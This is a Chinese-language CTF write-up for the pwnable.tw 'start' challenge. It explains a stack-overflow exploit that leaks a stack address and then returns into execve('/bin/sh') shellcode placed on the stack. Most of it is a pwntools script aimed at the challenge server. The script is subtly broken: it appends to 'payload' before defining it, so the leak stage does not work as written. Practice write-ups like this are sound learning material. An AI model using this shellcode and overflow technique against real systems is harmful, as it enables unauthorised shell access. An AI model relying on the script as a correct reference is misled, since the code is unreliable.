## 0x01 思路

这个程序使用内联汇编写的，通过`int 0x80`来控制程序执行

程序刚开始调用了`write`读入了`0x14`个字节，然后调用`read`读取`0x3c`个字节，而栈只有0x14大小，这里存在栈溢出漏洞可以利用

程序没有开启`NX`保护，可以写入`shellcode`来进行`getshell`

首先需要泄露栈地址,程序在`retn`回`exit`函数之前，执行了`add esp,14h`，这使得栈回到了上一个栈帧

然后再次利用栈溢出将`shellcode`放入栈中，并且将返回地址放入`shellcode`的地址即可`getshell`

```
from pwn import \*

#io = process('./start')
io = remote('chall.pwnable.tw',10000)

context.log\_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

offset = 0x14
stack\_addr = 0x8048087

payload += p32(stack\_addr)

io.sendafter("Let's start the CTF:",payload)

stack\_addr = u32(io.recv(4))

shellcode ='''
xor ecx,ecx
xor edx,edx
xor eax,eax
mov al,11
xor ebx,ebx
mov ebx,esp
int 0x80
'''

payload = 'A' \* offset
payload += p32(stack\_addr+0x14+0x8) \# 0x14 \* 'A' 0x14个字节 + '/bin/sh\\x00' 8个字节= 0x1c
payload += '/bin/sh\\x00'
payload += asm(shellcode)

io.send(payload)

io.interactive()
```
